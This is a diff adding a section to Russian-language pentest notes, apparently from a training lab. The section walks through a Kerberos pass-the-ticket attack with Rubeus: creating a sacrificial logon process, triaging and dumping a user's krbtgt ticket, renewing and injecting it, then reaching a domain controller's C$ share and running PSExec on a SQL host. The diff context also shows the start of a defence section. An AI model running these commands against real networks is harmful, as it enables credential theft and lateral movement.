@@ -30,6 +30,37 @@ misc::cmd
 whoami
 ```
 
+## Создание Жертвенного процесса
+
+> Жертвенный процесс нужен для того, чтобы не перезаписать текущую рабочую сессию пользователя или службы, но он может быть обнаружен и для него нужны права админа
+
+1) Создание процесса через NetOnly
+```powershell
+.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+```
+
+2) Просмотр всех тикетов, которые можно извлечь
+```powershell
+.\Rubeus.exe triage
+```
+
+3) Извлекаем интересующий нас билет ПОЛЬЗОВАТЕЛЯ
+```powershell
+.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap
+```
+
+4) Обновляем билет и сразу инжектируем в сессию
+```powershell
+Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt
+```
+
+5) Используем для доступа к сервису
+```cmd
+dir \\dc01\\c$
+# или
+PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
+```
+
 # Защита
 
 ### 1) Если пользователь в группе Protected Users:
